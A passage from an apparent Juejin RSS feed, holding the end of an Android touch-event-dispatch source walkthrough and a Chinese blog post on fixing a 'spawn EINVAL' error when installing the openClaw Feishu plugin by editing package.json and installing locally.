    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// 只要 View 是可点击的，onTouchEvent 就会返回 true</span>
}
</code></pre>
<p>这是 Android 事件分发的一个重要结论：<strong>一个可点击的 View（如</strong> <strong>Button</strong> <strong>）在</strong> <strong><code>onTouchEvent</code></strong> <strong>中默认会消耗掉所有事件</strong>。即使它是 <code>DISABLED</code>（禁用）状态，只要它是 <code>CLICKABLE</code> 的，它依然会返回 <code>true</code>，防止事件穿透到下层</p>
<h5 data-id="heading-17">ACTION_DOWN：</h5>
<pre><code class="hljs language-scss" lang="scss">boolean isInScrollingContainer = <span class="hljs-built_in">isInScrollingContainer</span>();
if (isInScrollingContainer) {
    mPrivateFlags |= PFLAG_PREPRESSED;
    <span class="hljs-comment">// ... 发送一个延时 100ms 的 Tap 任务 ...</span>
    <span class="hljs-built_in">postDelayed</span>(mPendingCheckForTap, ViewConfiguration.getTapTimeout());
} else {
    <span class="hljs-built_in">setPressed</span>(true, x, y); <span class="hljs-comment">// 不在滑动容器，立即显示按下状态</span>
    <span class="hljs-built_in">checkForLongClick</span>(...); <span class="hljs-comment">// 开始长按计时</span>
}
</code></pre>
<ul>
<li>如果 View 在 <code>ScrollView</code> 等滑动容器中，系统会<strong>延迟显示</strong>按下状态（100ms）。这是为了防止用户只是想滑动，结果手指一碰按钮就闪现按下效果。</li>
<li>如果不在滑动容器，立即调用 <code>setPressed(true)</code> 变色，并开启长按定时器。</li>
</ul>
<h5 data-id="heading-18">ACTION_MOVE：</h5>
<pre><code class="hljs language-scss" lang="scss">if (!pointInView(x, y, touchSlop)) {
    <span class="hljs-comment">// 只要手指移出了 View 的范围（加上系统允许的微小偏差 touchSlop）</span>
    <span class="hljs-built_in">removeTapCallback</span>();
    <span class="hljs-built_in">removeLongPressCallback</span>();
    if ((mPrivateFlags &amp; PFLAG_PRESSED) != <span class="hljs-number">0</span>) {
        <span class="hljs-built_in">setPressed</span>(false); <span class="hljs-comment">// 取消按下状态</span>
    }
}
</code></pre>
<p>系统允许用户在点击时有轻微的晃动（<code>touchSlop</code>）。但一旦手指移出 View 范围，长按和点击逻辑都会被取消，按钮也会变回原来的颜色。</p>
<h5 data-id="heading-19">ACTION_UP：</h5>
<pre><code class="hljs language-scss" lang="scss">if (!mHasPerformedLongPress &amp;&amp; !mIgnoreNextUpEvent) {
    <span class="hljs-built_in">removeLongPressCallback</span>(); <span class="hljs-comment">// 移除长按计时</span>
    <span class="hljs-comment">// ...</span>
    if (!post(mPerformClick)) {
        <span class="hljs-built_in">performClickInternal</span>(); <span class="hljs-comment">// 真正触发 OnClickListener.onClick() 的地方</span>
    }
}
</code></pre>
<ul>
<li><strong>优先级判定</strong>：如果已经触发了长按（<code>mHasPerformedLongPress</code> 为 true），那么抬起时就不会再触发点击。</li>
<li><strong>异步执行</strong>：使用 <code>post(mPerformClick)</code> 是为了让 View 先完成视觉上的状态切换（变回原色），然后再执行点击逻辑，避免点击任务阻塞了 UI 的状态更新。</li>
</ul>
<h5 data-id="heading-20">ACTION_CANCEL</h5>
<pre><code class="hljs language-scss" lang="scss">case MotionEvent<span class="hljs-selector-class">.ACTION_CANCEL</span>:
    if (clickable) {
        <span class="hljs-built_in">setPressed</span>(false);
    }
    <span class="hljs-built_in">removeTapCallback</span>();
    <span class="hljs-built_in">removeLongPressCallback</span>();
    <span class="hljs-comment">// ... 重置所有标记位 ...</span>
    break;
</code></pre>
<p>当父容器（如 <code>RecyclerView</code>）拦截了事件时，子 View 会收到 <code>CANCEL</code>。此时必须清理掉所有的计时器和按下状态，否则 View 会一直显示“被按下”的颜色。</p>
<p>我们发现只要子View可以点击，就会返回true，这个判断下的事件状态只是执行不同的操作</p>
<p><strong>为什么是这样的判定？如果是这样的话，事件会不会看起来很容易消费？</strong></p>
<p>其实不然，首先我们要了解View的遍历逻辑，子View是根据根右左的顺序执行，并且是优先调用子View的onTouchEvent方法，如果遍历到的这个子View刚好是可点击的，就会消费事件。之后就不会遍历了，这符合我们对事件消费的期望。</p>
<p>并且在拦截的情况下也不矛盾</p>
<p>在DOWN时拦截:根本不会走遍历的操作，就不会调用子ViewonTouchEvent方法.</p>
<p>在MOVE时拦截:虽然在DOWN时形成了单向链表mFirstTouchTarget，在下一次分发MOVE事件的时候，通过</p>
<pre><code class="hljs language-ini" lang="ini">  final boolean <span class="hljs-attr">cancelChild</span> = resetCancelNextUpFlag(target.child)
                       || intercepted<span class="hljs-comment">;</span>
if (dispatchTransformedTouchEvent(ev, cancelChild,target.child, target.pointerIdBits)) {
                    <span class="hljs-attr">handled</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;}</span>
</code></pre>
<p>给子View分发CANCEL事件(取消该View的按下状态,计时器等等)，并且清空链表，之后这个View就不会接收事件了</p>
<p>[<strong>对于这一帧“物理上的 MOVE 事件”，它的“移动数据”确实没有被任何 View 消费，被消费的仅仅是由它转化而来的“CANCEL 信号”。</strong> ]</p>
<h4 data-id="heading-21">禁用状态下的处理</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">if</span> ((viewFlags &amp; ENABLED_MASK) == DISABLED ...) {
    <span class="hljs-comment">// ... 抬起时清除按下状态 ...</span>
    <span class="hljs-keyword">return</span> clickable; 
}
</code></pre>
<p>如果 View 是禁用的（Disabled），它不会响应点击逻辑，但如果它原本是可点击的，它依然返回 <code>true</code>。<strong>这解释了为什么点击一个禁用的按钮，下方的布局不会收到点击事件。</strong></p>
<h4 data-id="heading-22">OnTouchListener和OnClickListener</h4>
<p>定位到View的dispatchTouchEvent方法中的这段代码：</p>
<pre><code class="hljs language-ini" lang="ini">if (li != null &amp;&amp; li.mOnTouchListener != null
        &amp;&amp; (mViewFlags &amp; ENABLED_MASK) == ENABLED
        &amp;&amp; li.mOnTouchListener.onTouch(this, event)) {
    <span class="hljs-attr">result</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}

if (!result &amp;&amp; onTouchEvent(event)) {
    <span class="hljs-attr">result</span> = <span class="hljs-literal">true</span><span class="hljs-comment">;</span>
}
</code></pre>
<p>在dispatchTouchEvent中，会判断View是否设置了OnTouchListener，如果设置了OnTouchListener，就会直接拦截事件，dispatchTouchEvent方法返回true，调用OnTouchListener的onTouch方法，而不会再触发后续的onTouchEvent方法。</p>
<p>再定位到View的onTouchEvent方法中的这段代码：</p>
<pre><code class="hljs language-scss" lang="scss">if (clickable || (viewFlags &amp; TOOLTIP) == TOOLTIP) {
    switch (action) {          
        case MotionEvent<span class="hljs-selector-class">.ACTION_UP</span>:
            if (!<span class="hljs-built_in">post</span>(mPerformClick)) {
                <span class="hljs-built_in">performClickInternal</span>();
            }
</code></pre>
<p>可以发现是在onTouchEvent方法中，判断了View是否可点击。若可点击且设置了OnClickListener，那么就会调用OnClickListener的onClick方法。</p>
<p><strong>按优先级排序，OnTouchListener&gt;OnTouchEvent&gt;OnClickListener。若设置了OnTouchListener，则不会触发后面两者。OnClickListener在ACTION_UP后触发。</strong></p>
<h2 data-id="heading-23">ViewGroup的onInterceptTouchEvent</h2>
<pre><code class="hljs language-scss" lang="scss">public boolean <span class="hljs-built_in">onInterceptTouchEvent</span>(MotionEvent ev) {
    <span class="hljs-comment">// 条件 1: 事件来源必须是鼠标 (MOUSE)</span>
    if (ev.isFromSource(InputDevice.SOURCE_MOUSE)
            <span class="hljs-comment">// 条件 2: 动作必须是按下 (ACTION_DOWN)</span>
            &amp;&amp; ev<span class="hljs-selector-class">.getAction</span>() == MotionEvent<span class="hljs-selector-class">.ACTION_DOWN</span>
            <span class="hljs-comment">// 条件 3: 必须是鼠标左键 (BUTTON_PRIMARY)</span>
            &amp;&amp; ev<span class="hljs-selector-class">.isButtonPressed</span>(MotionEvent.BUTTON_PRIMARY)
            <span class="hljs-comment">// 条件 4: 点击的位置必须在滚动条的“滑块”上 (Scrollbar Thumb)</span>
            &amp;&amp; <span class="hljs-built_in">isOnScrollbarThumb</span>(ev.getXDispatchLocation(<span class="hljs-number">0</span>), ev<span class="hljs-selector-class">.getYDispatchLocation</span>(<span class="hljs-number">0</span>))) {
        
        <span class="hljs-comment">// 如果上述 4 个条件同时满足，返回 true，表示拦截该事件</span>
        return true;
    }
    
    <span class="hljs-comment">// 默认情况（比如手指触摸、点击非滚动条区域等）返回 false</span>
    return false;
}
</code></pre>
<p>好文章推荐可以和这个做补充
<a href="https://juejin.cn/post/7168445102984003591" target="_blank" title="https://juejin.cn/post/7168445102984003591">Android斩首行动—滑动冲突作为移动开发，我们对滑动冲突可以说是屡见不鲜。这篇文章结合事件分发机制，对常见的滑动冲突 - 掘金</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[openClaw安装飞书插件｜核心踩坑：spawn EINVAL 错误终极解决指南]]></title>    <link>https://juejin.cn/post/7605529884824567871</link>    <guid>https://juejin.cn/post/7605529884824567871</guid>    <pubDate>2026-02-12T16:30:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605529884824567871" data-draft-id="7605807405306675263" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="openClaw安装飞书插件｜核心踩坑：spawn EINVAL 错误终极解决指南"/> <meta itemprop="keywords" content="人工智能"/> <meta itemprop="datePublished" content="2026-02-12T16:30:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="MicRabbit"/> <meta itemprop="url" content="https://juejin.cn/user/4135726601221641"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            openClaw安装飞书插件｜核心踩坑：spawn EINVAL 错误终极解决指南
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4135726601221641/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    MicRabbit
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T16:30:03.000Z" title="Thu Feb 12 2026 16:30:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>作为经常折腾本地工具的开发者，最近在部署openClaw飞书插件时，被 <code>spawn EINVAL</code> 报错卡了一下午！结合自己的实际操作，整理了这篇<strong>重点聚焦该错误</strong>的踩坑分享，从错误原因、无效误区、详细解决步骤，到兜底方案，全程干货，帮正在踩坑的小伙伴一次性解决，少走弯路！</p>
<p>先说明我的环境：Windows 和 Mac 环境都遇到同样问题，作为偏前端开发两个环境均安装了nvm管理Node版本，核心需求是本地部署openClaw飞书插件（自用机器人调试），无复杂部署场景，所有操作均为本地调试可用，新手也能跟着走。</p>
<p>OpenClaw的安装步骤就不重复了，跟着官网走就可以。</p>
<p>翻阅资料和看其他博主的视频时发现飞书插件安装时都没遇到我的问题，所以在解决问题之后反思了一下，大概率是我的Node环境是安装在nvm内的（该观点并未重复验证），先进入正文</p>
<h2 data-id="heading-0">一、核心报错：spawn EINVAL（必踩坑，先认清错误本质）</h2>
<p>这是openClaw安装飞书插件时最高频、最棘手的错误，很多小伙伴会被网上的过时方案误导，白费功夫。先明确错误的完整现象和核心原因，避免走偏。</p>
<h3 data-id="heading-1">❌ 完整错误现象（对照自查，确认你踩的是同一个坑）</h3>
<p>执行飞书插件安装命令 <code>openclaw plugins install @openclaw/feishu</code> 后，终端立即报错，无法继续安装，完整报错堆栈如下（重点标注核心错误 <code>spawn EINVAL</code>）：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5a9fbc147234a2db8eea1d8e1632e72~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=hvl2FtEBBo9C9xpg5rXNE6AGjsI%3D" alt="image.png" loading="lazy"/></p>
<p>核心特征：报错首行提示 <code>Failed to start CLI: Error: spawn EINVAL</code>，后续关联 <code>child_process.spawn</code> 相关堆栈，插件安装直接中断，重复执行命令依然报错。</p>
<h3 data-id="heading-2">🔍 错误核心原因（关键！搞懂原因才不会被误导）</h3>
<p>很多教程说“Node版本过高导致”，其实是错误的！结合我的排查和实操验证，核心原因是：</p>
<p><strong>openClaw飞书插件本地扩展包（feishu文件夹）中的 package.json 配置不兼容</strong> —— 该配置文件中，依赖版本、入口文件路径或脚本命令存在异常，导致Node.js的 <code>child_process.spawn</code> 方法无法正常创建子进程，进而启动CLI失败，报出 <code>spawn EINVAL</code>（无效参数）错误。</p>
<p>补充：该错误与Node版本无关（我用v22，只要修改配置，均可解决），无需降级Node，白费功夫的操作一定要避开。</p>
<h3 data-id="heading-3">❌ 网上常见无效尝试（别再踩！亲测3次均失败）</h3>
<p>一开始看到报错，我跟着网上的教程做了3种尝试，均无效，整理出来帮大家避坑：</p>
<ol>
<li>Node版本降级：用nvm降级到v20、v18，清理npm缓存、重新安装openClaw，报错依然存在；</li>
<li>直接重新安装插件：反复执行 <code>openclaw plugins install @openclaw/feishu</code>，甚至卸载重装openClaw，无法解决配置不兼容问题；</li>
<li>非管理员终端安装：未用管理员身份运行终端，导致权限不足，但即使提升权限，不修改配置依然报错（权限不是核心原因）。</li>
</ol>
<h3 data-id="heading-4">✅ 终极解决方案（亲测有效，分步拆解，新手可跟）</h3>
<p>核心逻辑：找到异常的 package.json 文件 → 备份并修改配置 → 本地重装插件 → 重启验证，步骤清晰，一步到位，全程无需降级Node。</p>
<p><strong>第一步：精准定位目标 package.json 文件（关键第一步，别找错路径）</strong> 该文件在openClaw的飞书插件扩展包中，路径根据你的nvm安装位置调整，我的路径如下（可直接复制，替换用户名即可）：<code>C:\nvm4w\nodejs\node_modules\openclaw\extensions\feishu</code>（MacOS找到对应的nvm目录内的openClaw的插件目录）操作：打开文件资源管理器，将上述路径粘贴到地址栏，回车即可快速定位，文件夹中会看到 <code>package.json</code> 文件（核心修改文件）。</p>
<p><strong>第二步：备份文件+修改配置（避免出错，重中之重）</strong> ① 备份文件：复制一份 <code>package.json</code> 文件，重命名为 <code>package.json.bak</code>（万一修改错误，可直接恢复原文件，避免插件彻底损坏）；② 修改配置：</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c098bb4549ab40cf8ad09672c59fe1a3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=zjQCWGTQWgMT13w362DTGnlPtT8%3D" alt="image.png" loading="lazy"/></p>
<p>修改这里 将 workspace:* 去掉</p>
<pre><code class="hljs language-json" lang="json">  <span class="hljs-attr">"devDependencies"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
     <span class="hljs-attr">"openclaw"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">""</span> 
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
</code></pre>
<p>从这里的修改上我怀疑导致报错的根本原因是：我本机环境安装的nvm 导致 workspace:* 的目录检查失败了</p>
<p><strong>第三步：安装openclaw官方文档使用本地代码安装飞书渠道</strong></p>
<p>openclaw官方文档 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.openclaw.ai%2Fzh-CN%2Fchannels%2Ffeishu" target="_blank" title="https://docs.openclaw.ai/zh-CN/channels/feishu" ref="nofollow noopener noreferrer">docs.openclaw.ai/zh-CN/chann…</a></p>
<p>使用本地安装的方式：
① 打开cmd或者powershell 进入飞书插件目录
② 使用npm i或者pnpm i安装依赖</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5789321323894f08a6a479f0688b9361~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=f2kbfOk9zVnMMiMxwnf8O5L8TCo%3D" alt="image.png" loading="lazy"/></p>
<p>至此 飞书插件安装成功！</p>
<p><strong>第四步：重启openclaw验证错误是否修复，并配置飞书</strong></p>
<p>① 重启openClaw： openclaw onboard 在Select channel时选择飞书</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9327f484e24744ad87db6850d0beb423~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=Qf%2FbMKa68nvDLJRhor67Z39ct9c%3D" alt="image.png" loading="lazy"/>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b701b5925588407b97d19e2f77b6149a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTWljUmFiYml0:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771518602&amp;x-signature=eeu2f5ctaZfiYkwK9iwGldMyDZM%3D" alt="image.png" loading="lazy"/></p>
<p>选择后不报错 可以配置飞书应用的 App ID 和  App Secret，即可在飞书创建应用并链接openclaw进行会话了！</p>
<h3 data-id="heading-5">🔧 兜底方案（若修改配置后仍报错，直接用这个）</h3>
<p>若按上述步骤操作后，依然报 <code>spawn EINVAL</code> 错误，大概率是 package.json 修改不到位，可直接用以下兜底方案，绕开配置修改难题：</p>
<ol>
<li>卸载当前飞书插件：<code>openclaw plugins uninstall @openclaw/feishu</code>；</li>
<li>删除feishu扩展包：删除 <code>C:\nvm4w\nodejs\node_modules\openclaw\extensions\feishu</code> 整个文件夹；</li>
<li>手动克隆插件源码：执行 <code>git clone https://github.com/openclaw/feishu.git</code>，将克隆后的feishu文件夹，复制到上述extensions目录下；</li>
<li>本地安装：进入feishu文件夹，执行 <code>npm install</code> 安装依赖，再执行 <code>openclaw plugins install ./</code>，重启openClaw即可。</li>
</ol>
<h2 data-id="heading-6">二、补充：报错解决后，简单配置（快速适配本地自用）</h2>
<p>重点分享报错处理，配置部分精简核心要点，无需深入，快速完成部署：</p>
<ul>
<li>Feishu DM policy（私信策略）：选<code>Pairing (recommended)</code>（配对模式），用户主动打招呼才能发私信，安全不骚扰；</li>
<li>Group chat policy（群聊策略）：选 <code>Allowlist</code>（白名单模式），只在自己的测试群响应，避免滥用；</li>
<li>Group chat allowlist（群聊白名单）：复制飞书群ID（群设置→最底部），多个群用英文逗号隔开，留空即禁用群聊响应；</li>
<li>feishu account name (default)：直接按回车，用默认账号即可，本地自用无需修改。</li>
</ul>
<h2 data-id="heading-7">三、核心总结（重点牢记，下次遇到直接解决）</h2>
<p>整篇分享聚焦 <code>spawn EINVAL</code> 错误，记住3个核心要点，下次遇到无需查教程：</p>
<ol>
<li>错误本质：飞书插件的 package.json 配置不兼容，与Node版本无关，无需降级；</li>
<li>核心解决：定位 → 备份修改 package.json → 管理员本地重装 → 重启验证；</li>
<li>兜底方案：删除异常扩展包，手动克隆源码安装，100%解决配置问题。</li>
</ol>
<h2 data-id="heading-8">四、最后碎碎念</h2>
<p>其实 <code>spawn EINVAL</code> 报错并不难解决，踩坑主要是因为网上部分解决方案过时，误导大家去降级Node。希望这篇重点聚焦该错误的分享，能帮到正在折腾openClaw飞书插件的小伙伴，避开无效操作，快速解决问题。</p>
<p>如果大家遇到了其他相关报错，或者有更简洁的解决方法，欢迎在评论区交流补充，一起少走弯路～</p>
<p>#openClaw #飞书插件 #飞书机器人 #开发者踩坑 #spawn EINVAL #本地部署 #Node.js #前端工具</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[告别 LLM 供应商锁定 — SmartChat 的多模型 Provider 抽象层设计实践]]></title>    <link>https://juejin.cn/post/7605811866908000265</link>    <guid>https://juejin.cn/post/7605811866908000265</guid>    <pubDate>2026-02-12T17:17:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605811866908000265" data-draft-id="7605711582430494771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="告别 LLM 供应商锁定 — SmartChat 的多模型 Provider 抽象层设计实践"/> <meta itemprop="keywords" content="前端,后端"/> <meta itemprop="datePublished" content="2026-02-12T17:17:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="梦里寻码"/> <meta itemprop="url" content="https://juejin.cn/user/528241507974520"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            告别 LLM 供应商锁定 — SmartChat 的多模型 Provider 抽象层设计实践
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/528241507974520/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    梦里寻码
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T17:17:13.000Z" title="Thu Feb 12 2026 17:17:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
